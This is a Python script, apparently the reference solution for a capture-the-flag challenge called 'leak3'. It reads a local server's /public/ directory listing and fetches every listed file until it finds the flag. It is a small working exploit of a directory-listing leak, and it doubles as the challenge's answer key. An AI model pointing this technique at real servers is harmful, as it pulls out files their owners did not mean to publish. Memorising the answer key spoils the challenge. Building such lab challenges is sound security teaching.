#!/usr/bin/env python3
"""Reference exploit for leak3 (formerly leak-dir-listing).

List /public/, spot flag.txt, fetch it.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8012")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    r = requests.get(BASE + "/public/", timeout=5)
    names = re.findall(r"href=\"/public/([^\"]+)", r.text)
    if not names:
        sys.stderr.write("no listing entries\n")
        return 1
    # The listing shows several files; the flag is in one of them.
    for name in names:
        fr = requests.get(BASE + "/public/" + name, timeout=5)
        fm = re.search(r"flag\{[^}]*\}", fr.text)
        if fm:
            print(fm.group(0))
            return 0
    sys.stderr.write("no flag in any listed file\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
